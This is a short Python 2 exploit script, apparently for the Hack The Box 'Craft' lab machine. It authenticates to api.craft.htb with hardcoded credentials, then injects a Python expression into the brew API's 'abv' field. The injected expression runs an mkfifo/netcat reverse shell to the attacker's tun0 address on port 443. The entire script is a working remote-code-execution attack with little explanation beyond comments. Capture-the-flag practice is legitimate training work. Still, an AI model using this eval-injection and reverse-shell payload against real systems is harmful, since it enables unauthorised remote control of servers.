#!/usr/bin/env python2

from __future__ import print_function

import requests
import json
import netifaces

# Disable ssl warnings from requests
requests.packages.urllib3.disable_warnings()

# Your local ip address
local_ip = netifaces.ifaddresses('tun0')[2][0]['addr']

# API endpoints
login_endpoint = "https://api.craft.htb/api/auth/login"
brew_endpoint = "https://api.craft.htb/api/brew/"

print("[*] Getting a session cookie")

# Post auth to generate a new token
response = requests.get(login_endpoint, auth=("dinesh", "4aUh0A8PbVJxgd"), verify=False)

# Parse token from reponse
token = json.loads(response.text)["token"]

# Pass token along the headers
headers = { "X-Craft-API-Token": token }

# Store the payload for the request
payload = "(__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s 443 >/tmp/f').read()) and 0.1" % local_ip

# Craft a new dict with the supplied payload
data = {"abv": payload, "name": "test", "brewer": "dualfade", "style": "none"}

print("[*] Sending payload")

# Post the data
response = requests.post(brew_endpoint, headers=headers, json=data, verify=False)

# Print the response
print("[*] Check your listener...")
